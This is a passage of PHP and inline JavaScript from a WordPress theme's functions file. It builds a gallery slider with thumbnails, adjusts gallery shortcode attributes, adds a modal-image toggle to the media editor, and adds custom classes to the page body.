                    <div class = "td-button td-item' . $cur_item_nr . '">
                        <div class = "td-border"></div>
                    </div>';

                $cur_item_nr++;
            }//end check for images
        }//end foreach



        //check if we have html code for the slider
        if(!empty($slide_display_html) and !empty($slide_cursor_html)) {

            //get the number of slides
            $nr_of_slides = count($image_ids);
            if($nr_of_slides < 0) {
                $nr_of_slides = 0;
            }

            $buffy = '
                <style type="text/css">
    ' .
                $slide_images_thumbs_css . '
                </style>

                <div id="' . $gallery_slider_unique_id . '" class="' . $td_nr_columns_slide . '">
                    <div class="post_galery_slide_1">
                        <div class="td-gallery-slide-top">
                           <div class="td-gallery-title">' . $title_slide . '</div>

                            <div class="td-gallery-controls-wrapper">
                                <div class="td-gallery-slide-count"><span class="td-gallery-slide-item-focus">1</span> ' . __td('of') . ' ' . $nr_of_slides . '</div>
                                <div class="td-gallery-slide-prev-next-but">
                                    <i class = "td-icon-left doubleSliderPrevButton"></i>
                                    <i class = "td-icon-right doubleSliderNextButton"></i>
                                </div>
                            </div>
                        </div>

                        <div class = "td-doubleSlider-1 ">
                            <div class = "td-slider">
' . $slide_display_html . '
                            </div>
                        </div>

                        <div class = "td-doubleSlider-2">
                            <div class = "td-slider">
' . $slide_cursor_html . '
                            </div>
                        </div>

                    </div>

                </div>
';

            $slide_javascript = '
                    //total number of slides
                    var ' . $gallery_slider_unique_id . '_nr_of_slides = ' . $nr_of_slides . ';
                    var ' . $gallery_slider_unique_id . '_is_slider_moving = false;


                    var ' . $gallery_slider_unique_id . '_is_slider_timer = "";


                    jQuery(document).ready(function() {
                        //magnific popup
                        jQuery("#' . $gallery_slider_unique_id . ' .td-slide-popup-gallery").magnificPopup({
                            delegate: "a",
                            type: "image",
                            tLoading: "Loading image #%curr%...",
                            mainClass: "mfp-img-mobile",
                            gallery: {
                            enabled: true,
                                navigateByImgClick: true,
                                preload: [0,1]
                            },
                            image: {
                            tError: "<a href=\'%url%\'>The image #%curr%</a> could not be loaded.",
                                    titleSrc: function(item) {//console.log(item.el);
                                //alert(jQuery(item.el).data("caption"));
                                return item.el.attr("data-caption") + "<div>" + item.el.attr("data-description") + "</div>";
                            }
                            },
                            zoom: {
                            enabled: true,
                                    duration: 300,
                                    opener: function(element) {
                                return element.find("img");
                            }
                            },

                            callbacks: {
                            change: function() {
                                // Will fire when popup is closed
                                jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider("goToSlide", this.currItem.index + 1 );
                            }
                        }

                        });



                        jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider({
                            scrollbar: true,
                            snapToChildren: true,
                            desktopClickDrag: true,
                            infiniteSlider: true,
                            navPrevSelector: jQuery("#' . $gallery_slider_unique_id . ' .doubleSliderPrevButton"),
                            navNextSelector: jQuery("#' . $gallery_slider_unique_id . ' .doubleSliderNextButton"),
                            scrollbarHeight: "2",
                            scrollbarBorderRadius: "0",
                            scrollbarOpacity: "0.5",
                            onSliderLoaded: doubleSlider2Load_' . $gallery_slider_unique_id . ',
                            onSlideChange: doubleSlider2Load_' . $gallery_slider_unique_id . ',

                            keyboardControls:true
                        });

                        //small image slide
                        jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2 .td-button").each(function(i) {

                            jQuery(this).bind("click", function() {
                                if(' . $gallery_slider_unique_id . '_is_slider_moving == false) {
                                    jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider("goToSlide", i+1);
                                }
                                });
                        });

                        //check the number of slides
                        if(' . $gallery_slider_unique_id . '_nr_of_slides > ' . $td_double_slider2_no_js_limit . ') {
                            jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2").iosSlider({
                                desktopClickDrag: true,
                                snapToChildren: true,
                                snapSlideCenter: true,
                                infiniteSlider: true,
                                onSlideChange: function() {
                                ' . $gallery_slider_unique_id . '_is_slider_moving = true;

                                    /*
                                    clearTimeout(' . $gallery_slider_unique_id . '_is_slider_timer);

                                    ' . $gallery_slider_unique_id . '_is_slider_timer = setTimeout(function(){
                                       ' . $gallery_slider_unique_id . '_is_slider_moving = false;
                                    },3000);

                                    */
                                }, //added this to disable clicking when dragging
                                onSlideComplete: function () {
                                ' . $gallery_slider_unique_id . '_is_slider_moving = false;
                                }
                            });
                        } else {
                            jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2").addClass("td_center_slide2");
                        }

                        function doubleSlider2Load_' . $gallery_slider_unique_id . '(args) {
                            //var currentSlide = args.currentSlideNumber;
                            jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2").iosSlider("goToSlide", args.currentSlideNumber);


                            //put a transparent border around all small sliders
                            jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2 .td-button .td-border").css("border", "3px solid #ffffff").css("opacity", "0.5");
                            jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2 .td-button").css("border", "0");

                            //put a white border around the focused small slide
                            jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2 .td-button:eq(" + (args.currentSlideNumber-1) + ") .td-border").css("border", "3px solid #ffffff").css("opacity", "1");
                            //jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2 .td-button:eq(" + (args.currentSlideNumber-1) + ")").css("border", "3px solid #ffffff");

                            //write the current slide number
                            td_gallery_write_current_slide_' . $gallery_slider_unique_id . '(args.currentSlideNumber);
                        }

                        //writes the current slider beside to prev and next buttons
                        function td_gallery_write_current_slide_' . $gallery_slider_unique_id . '(slide_nr) {
                            jQuery("#' . $gallery_slider_unique_id . ' .td-gallery-slide-item-focus").html(slide_nr);
                        }



                    });';


            td_js_buffer::add_to_footer($slide_javascript);
        }//end check if we have html code for the slider
    }//end if slide

    //!!!!!! WARNING
    //$return has to be != empty to overwride the default output
    return $buffy;
}

add_filter( 'post_gallery', 'my_gallery_shortcode', 10, 4 );

/*
global $wpVC_setup;
$wpVC_setup->composer->disableUpdater();

remove_action( 'in_plugin_update_message-js_composer/js_composer.php', array( $wpVC_setup, 'addUpgradeMessageLink' ), 10 );

//print_r($wpVC_setup);
*/





/**
 * filter the gallery shortcode
 * @param $out
 * @return mixed
 */
function td_gallery_atts_modifier($out) {
    // td_global::$cur_single_template_sidebar_pos; //is set in single.php @todo set it also on the page template
    if (!empty($out['columns']) and $out['columns'] == 1) {
        //link to files instead of no link or attachement. The file is used by magnific pupup
        $out['link'] = 'file';
        $out['size'] = 'full';
    }
    return $out;
}
add_filter( 'shortcode_atts_gallery', 'td_gallery_atts_modifier', 1); //run with 1 priority, allow anyone to overwrite our hook.














/**
 * td-modal-image support in tinymce
 */
function td_change_backbone_js_hook() {
    //change the backbone js template
    ?>
    <script type="text/javascript">


        (function (){


            var td_template_content = jQuery('#tmpl-image-details').text();

            var td_our_content = '' +
    '<div class="setting">' +
    '<span>Modal image</span>' +
    '<div class="button-large button-group" >' +
    '<button class="button active td-modal-image-off" value="left">Off</button>' +
    '<button class="button td-modal-image-on" value="left">On</button>' +
    '</div><!-- /setting -->';

            //inject our settings in the template - before <div class="setting align">
            td_template_content = td_template_content.replace('<div class="setting align">', td_our_content + '<div class="setting align">');

            //save the template
            jQuery('#tmpl-image-details').html(td_template_content);

            //modal off - click event
            jQuery( ".td-modal-image-on" ).live( "click", function() {
                if (jQuery(this).hasClass('active')) {
                    return;
                }
                td_add_image_css_class('td-modal-image');

                jQuery( ".td-modal-image-off").removeClass('active');
                jQuery( ".td-modal-image-on").addClass('active');
            });

            //modal on - click event
            jQuery( ".td-modal-image-off" ).live( "click", function() {
                if (jQuery(this).hasClass('active')) {
                    return;
                }

                td_remove_image_css_class('td-modal-image');

                jQuery( ".td-modal-image-off").addClass('active');
                jQuery( ".td-modal-image-on").removeClass('active');
            });





            //util functions to edit the image details in wp-admin
            function td_add_image_css_class(new_class) {
                var td_extra_classes_value = jQuery('*[data-setting="extraClasses"]').val();
                jQuery('*[data-setting="extraClasses"]').val(td_extra_classes_value + ' ' + new_class);
                jQuery('*[data-setting="extraClasses"]').change(); //trigger the change event for backbonejs
            }

            function td_remove_image_css_class(new_class) {
                var td_extra_classes_value = jQuery('*[data-setting="extraClasses"]').val();

                //try first with a space before the class
                var td_regex = new RegExp(" " + new_class,"g");
                td_extra_classes_value = td_extra_classes_value.replace(td_regex, '');


                var td_regex = new RegExp(new_class,"g");
                td_extra_classes_value = td_extra_classes_value.replace(td_regex, '');

                jQuery('*[data-setting="extraClasses"]').val(td_extra_classes_value);
                jQuery('*[data-setting="extraClasses"]').change(); //trigger the change event for backbonejs
            }




            //monitor the backbone template for the current status of the picture
            setInterval(function(){
                var td_extra_classes_value = jQuery('*[data-setting="extraClasses"]').val();
                if (typeof td_extra_classes_value !== 'undefined' && td_extra_classes_value != '') {
                    // if we have modal on, switch the toggle
                    if (td_extra_classes_value.indexOf('td-modal-image') > -1) {
                        jQuery( ".td-modal-image-off").removeClass('active');
                        jQuery( ".td-modal-image-on").addClass('active');
                    }


                }

            }, 1000);


        })(); //end anon function






    </script>
<?php
}
add_action('print_media_templates', 'td_change_backbone_js_hook');





/**
 * add custom classes to the single templates
 * @param $classes
 * @returns the classes
 *
 * @last modified by Radu A. in 2014.7.24: added option to add class when default site post template is set in Theme Panel
 */
function td_add_single_template_class($classes){
    if (is_single()) {
        global $post;
        //read the custom single post settings
        $td_post_theme_settings = get_post_meta($post->ID, 'td_post_theme_settings', true);

        //if there is a post template added from add/edit post backend page
        if (!empty($td_post_theme_settings['td_post_template'])) {
            $classes []= sanitize_html_class($td_post_theme_settings['td_post_template']);

            //if not, and we have the default site post template set then, use it
        } else {
            $td_default_site_post_template = td_util::get_option('td_default_site_post_template');

            if(!empty($td_default_site_post_template)) {
                $classes []= sanitize_html_class($td_default_site_post_template);
            }
        }
    }
    return $classes;
}
add_filter('body_class', 'td_add_single_template_class');




/**
 * Add, on theme body element, the custom classes from Theme Panel -> Custom Css -> Custom Body class(s)
 */
function td_my_custom_class_names_on_body($classes) {
    //get the custom classes from theme options
    $custom_classes = td_util::get_option('td_body_classes');

    if(!empty($custom_classes)) {
        // add 'custom classes' to the $classes array
        $classes[] = $custom_classes;
    }

    // return the $classes array
    return $classes;
}
add_filter('body_class','td_my_custom_class_names_on_body');



